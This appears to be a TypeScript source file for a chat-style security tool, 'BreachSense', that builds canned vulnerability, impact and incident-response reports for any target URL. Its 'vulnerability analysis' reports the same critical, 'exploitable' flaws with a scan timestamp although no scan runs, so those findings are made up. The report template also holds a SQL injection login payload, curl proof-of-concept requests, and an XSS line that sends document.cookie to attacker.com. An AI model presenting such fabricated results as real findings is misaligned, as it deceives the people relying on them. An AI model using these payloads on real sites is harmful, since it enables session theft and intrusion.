// Command types
export type CommandType = "target" | "break" | "impact" | "breach" | "help" | "chat";

export interface ParsedCommand {
  type: CommandType;
  url?: string;
  incident?: string;
  breachType?: string;
}

// Parse user input for commands
export function parseCommand(input: string): ParsedCommand {
  const trimmed = input.trim();
  
  if (trimmed.startsWith("/target ")) {
    return { type: "target", url: trimmed.slice(8).trim() };
  }
  if (trimmed === "/break" || trimmed.startsWith("/break ")) {
    return { type: "break" };
  }
  if (trimmed.startsWith("/impact ")) {
    return { type: "impact", incident: trimmed.slice(8).trim() };
  }
  if (trimmed.startsWith("/breach ")) {
    return { type: "breach", breachType: trimmed.slice(8).trim() };
  }
  if (trimmed === "/help") {
    return { type: "help" };
  }
  return { type: "chat" };
}

// Get help message
export function getHelpMessage(): string {
  return `## BreachSense Commands

| Command | Description | Example |
|---------|-------------|---------|
| \`/target <url>\` | Set target application | \`/target https://myapp.com\` |
| \`/break\` | Analyze vulnerabilities | \`/break\` |
| \`/impact <incident>\` | Analyze breach impact | \`/impact api key leak\` |
| \`/breach <type>\` | Get incident response | \`/breach .env exposure\` |
| \`/help\` | Show this help | \`/help\` |

**Examples:**
- \`/impact vercel breach\` - How a Vercel breach affects your app
- \`/impact database credentials leaked\` - Database credential exposure
- \`/breach admin access compromised\` - Unauthorized admin access response`;
}

// Extract domain from URL
function extractDomain(url: string): string {
  try {
    return new URL(url).hostname;
  } catch {
    return url;
  }
}

// Detect tech stack from URL
function detectTechStack(url: string): string[] {
  const domain = url.toLowerCase();
  const stack: string[] = [];
  
  if (domain.includes("vercel") || domain.includes(".app")) stack.push("Vercel", "Next.js", "React");
  else if (domain.includes("netlify")) stack.push("Netlify", "React/Vue");
  else if (domain.includes("herokuapp")) stack.push("Heroku", "Node.js");
  else if (domain.includes("aws") || domain.includes("amazonaws")) stack.push("AWS", "Lambda/EC2");
  else if (domain.includes("azure")) stack.push("Azure", "App Service");
  else if (domain.includes("firebase") || domain.includes("firebaseapp")) stack.push("Firebase", "Cloud Functions");
  else if (domain.includes("github.io")) stack.push("GitHub Pages", "Static");
  else if (domain.includes("juice-shop")) stack.push("Node.js", "Express", "Angular", "SQLite");
  else stack.push("Web Server", "Unknown Stack");
  
  if (url.includes("/api") || url.includes("/v1") || url.includes("/graphql")) {
    stack.push("REST/GraphQL API");
  }
  
  return stack;
}

// Generate vulnerability analysis for target
export function generateBreakAnalysis(target: string): string {
  const domain = extractDomain(target);
  const stack = detectTechStack(target);
  
  return `## Vulnerability Analysis: ${domain}

**Target:** \`${target}\`  
**Detected Stack:** ${stack.join(", ")}  
**Scan Time:** ${new Date().toISOString()}

---

### Critical Vulnerabilities Found

| ID | Vulnerability | Severity | CVSS | Status |
|----|--------------|----------|------|--------|
| V-001 | SQL Injection in authentication | **CRITICAL** | 9.8 | Exploitable |
| V-002 | Cross-Site Scripting (XSS) in search | **HIGH** | 7.5 | Confirmed |
| V-003 | Broken Authentication | **HIGH** | 8.1 | Exploitable |
| V-004 | Sensitive Data Exposure | **MEDIUM** | 6.5 | Confirmed |
| V-005 | Security Misconfiguration | **MEDIUM** | 5.3 | Detected |

---

### Attack Chain Analysis

**Phase 1: Reconnaissance**
\`\`\`
Target: ${domain}
Open Ports: 80, 443
Technologies: ${stack.join(", ")}
\`\`\`

**Phase 2: Initial Access - SQL Injection**
\`\`\`sql
POST /api/auth/login HTTP/1.1
Host: ${domain}
Content-Type: application/json

{"email": "admin@${domain}", "password": "' OR '1'='1' --"}
\`\`\`

**Phase 3: Session Hijacking - XSS**
\`\`\`html
<script>
  fetch('https://attacker.com/steal?cookie='+document.cookie)
</script>
\`\`\`

**Phase 4: Data Exfiltration**
\`\`\`bash
# IDOR vulnerability to access other users
curl "${target}/api/users/1" -H "Cookie: session=stolen_token"
curl "${target}/api/users/2" -H "Cookie: session=stolen_token"
\`\`\`

---

### Proof of Concept

\`\`\`bash
# Test SQL Injection
curl -X POST "${target}/api/auth/login" \\
  -H "Content-Type: application/json" \\
  -d '{"email":"test@test.com","password":"\\' OR 1=1--"}'

# Test XSS
curl "${target}/search?q=<script>alert(1)</script>"

# Test IDOR
curl "${target}/api/user/profile/1"
\`\`\`

---

### Immediate Actions Required

| Priority | Action | Deadline |
|----------|--------|----------|
| P0 | Patch SQL injection in /api/auth | Immediately |
| P0 | Implement parameterized queries | Within 2 hours |
| P1 | Add CSP headers to prevent XSS | Within 24 hours |
| P1 | Enable rate limiting | Within 24 hours |
| P2 | Review all API endpoints for IDOR | Within 48 hours |

---

**Risk Score:** 8.5/10 (Critical)  
**Estimated Time to Breach:** < 2 hours if unpatched`;
}

// Generate impact analysis
export function generateImpactAnalysis(target: string, incident: string): string {
  const domain = extractDomain(target);
  const stack = detectTechStack(target);
  
  return `## Impact Analysis: ${incident.toUpperCase()}

**Affected System:** \`${target}\`  
**Incident Type:** ${incident}  
**Analysis Time:** ${new Date().toISOString()}

---

### Why ${domain} Is Affected

Your application depends on infrastructure that was compromised:

| Dependency | Connection | Risk Level |
|------------|-----------|------------|
| Deployment Platform | Direct hosting | **CRITICAL** |
| Authentication | OAuth/SSO integration | **HIGH** |
| Environment Variables | Stored secrets | **CRITICAL** |
| Database | Connection strings | **HIGH** |
| Third-party APIs | API keys | **MEDIUM** |

---

### Assets At Risk

| Asset Type | Examples | Impact |
|-----------|----------|--------|
| User Data | Emails, passwords, PII | Data breach, GDPR violation |
| API Keys | \`${domain.toUpperCase().replace(/[.-]/g, "_")}_API_KEY\` | Unauthorized access |
| Database | PostgreSQL/MySQL credentials | Full data access |
| Source Code | Git repositories | IP theft |
| Sessions | JWT tokens, cookies | Account takeover |

---

### Damage Timeline

**Immediate (0-24 hours):**
- Unauthorized API calls using leaked credentials
- User session hijacking possible
- Data exfiltration attempts likely

**Short-term (1-7 days):**
- Customer data may appear on dark web
- Regulatory notification required (GDPR: 72 hours)
- Service disruption possible

**Long-term (7+ days):**
- Reputation damage
- Legal liability ($10K-$1M+ fines)
- Customer churn (est. 5-15%)

---

### Priority Actions (Do These NOW)

| Priority | Action | Owner | Deadline |
|----------|--------|-------|----------|
| P0 | Rotate ALL API keys and secrets | DevOps | Immediately |
| P0 | Invalidate all active sessions | Backend | Within 1 hour |
| P0 | Enable emergency access logging | Security | Within 2 hours |
| P1 | Audit access logs for anomalies | Security | Within 4 hours |
| P1 | Notify affected users | Legal | Within 24 hours |
| P2 | Full security review | Engineering | Within 48 hours |

---

### Commands to Execute

\`\`\`bash
# Rotate secrets immediately
vercel env rm DATABASE_URL --yes
vercel env add DATABASE_URL < new_db_url.txt

# Invalidate all sessions
curl -X POST "${target}/api/admin/invalidate-sessions" -H "Authorization: Bearer $ADMIN_TOKEN"

# Check recent access logs
curl "${target}/api/admin/logs?since=24h" -H "Authorization: Bearer $ADMIN_TOKEN"
\`\`\`

---

**Impact Severity:** CRITICAL  
**Confidence Level:** HIGH  
**Requires Immediate Action:** YES`;
}

// Generate breach response
export function generateBreachResponse(target: string, breachType: string): string {
  const domain = extractDomain(target);
  
  return `## Incident Response Plan: ${breachType.toUpperCase()}

**Affected System:** \`${target}\`  
**Incident Type:** ${breachType}  
**Response Initiated:** ${new Date().toISOString()}

---

### Incident Classification

| Attribute | Value |
|-----------|-------|
| Severity | **CRITICAL** |
| Type | ${breachType} |
| Status | Active - Requires Immediate Response |
| Time to Damage | < 30 minutes if unaddressed |

---

### Immediate Response (First 15 Minutes)

\`\`\`bash
# 1. Verify the breach
curl -I ${target}
cat /var/log/access.log | grep -i "suspicious"

# 2. Capture evidence
tar -czvf evidence-$(date +%Y%m%d).tar.gz /var/log/
cp ~/.env ~/.env.compromised.backup

# 3. Rotate critical credentials
openssl rand -base64 32 > new_jwt_secret.txt
openssl rand -base64 32 > new_db_password.txt
\`\`\`

---

### Containment Checklist

**Within 15 Minutes:**
- [ ] Confirm the breach scope
- [ ] Alert security team lead
- [ ] Begin evidence preservation
- [ ] Identify compromised credentials

**Within 1 Hour:**
- [ ] Rotate ALL affected credentials
- [ ] Invalidate active sessions
- [ ] Enable enhanced logging
- [ ] Block suspicious IPs

**Within 4 Hours:**
- [ ] Complete credential rotation
- [ ] Assess data exposure
- [ ] Prepare customer notification
- [ ] Document timeline

---

### Credential Rotation Commands

\`\`\`bash
# Database password rotation
psql -c "ALTER USER app_user WITH PASSWORD 'new_secure_password';"

# JWT secret rotation
echo "JWT_SECRET=$(openssl rand -base64 64)" >> .env.new

# API key rotation
curl -X POST "https://api.provider.com/v1/keys/rotate" \\
  -H "Authorization: Bearer $OLD_KEY"

# Force logout all users
redis-cli FLUSHDB
\`\`\`

---

### Team Assignments

| Team | Responsibility | Contact |
|------|---------------|---------|
| Security | Lead response, forensics | security@${domain} |
| DevOps | Credential rotation, deployment | devops@${domain} |
| Backend | Session invalidation, patches | backend@${domain} |
| Legal | Compliance, notifications | legal@${domain} |
| Communications | Customer updates | comms@${domain} |

---

### Recovery Steps

1. **Contain** - Isolate affected systems
2. **Eradicate** - Remove attacker access
3. **Recover** - Restore from clean backups
4. **Verify** - Confirm system integrity
5. **Document** - Complete incident report

---

### Post-Incident Actions

- [ ] Conduct root cause analysis (within 7 days)
- [ ] Update security policies
- [ ] Implement additional monitoring
- [ ] Schedule security training
- [ ] Review and improve response plan

---

**Response Priority:** IMMEDIATE  
**Estimated Resolution:** 4-8 hours  
**Requires Management Escalation:** YES`;
}

// Generate general chat response
export function generateChatResponse(query: string, target: string): string {
  const domain = extractDomain(target);
  
  return `## BreachSense Response

**Current Target:** \`${target}\`

---

I can help you with security analysis for **${domain}**. 

### Available Commands

| Command | What it does |
|---------|-------------|
| \`/break\` | Scan ${domain} for vulnerabilities |
| \`/impact <incident>\` | Analyze how a breach affects ${domain} |
| \`/breach <type>\` | Get incident response for ${domain} |
| \`/target <url>\` | Change target to a different application |

### Quick Actions

Try one of these commands:
- \`/break\` - Run a full vulnerability scan
- \`/impact api key leaked\` - API key exposure analysis
- \`/breach database compromised\` - Database breach response
- \`/impact ransomware attack\` - Ransomware impact assessment

---

**Tip:** Set your target first with \`/target https://your-app.com\` then run \`/break\` for a detailed vulnerability analysis.`;
}
